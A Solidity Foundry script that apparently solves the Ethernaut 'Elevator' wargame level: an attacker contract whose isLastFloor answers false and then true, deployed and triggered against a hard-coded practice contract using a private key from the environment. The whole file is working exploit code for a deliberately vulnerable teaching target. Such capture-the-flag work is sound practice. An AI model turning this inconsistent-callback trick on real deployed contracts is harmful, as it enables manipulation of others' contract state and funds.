// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/11-Elevator.sol";

contract MyBuilding {

    bool private mySwitch;
    Elevator public elevatorInstance = Elevator(0x5cc80a9442149d74b9B3B5623645Db445797d94b);

    function startAttack() external {
        elevatorInstance.goTo(0);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if(!mySwitch){
            mySwitch = true;
            return false;
        } else {
            return true;
        }
    }
}

contract ElevatorSolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MyBuilding myBuilding = new MyBuilding();
        myBuilding.startAttack();
        vm.stopBroadcast();
    }
}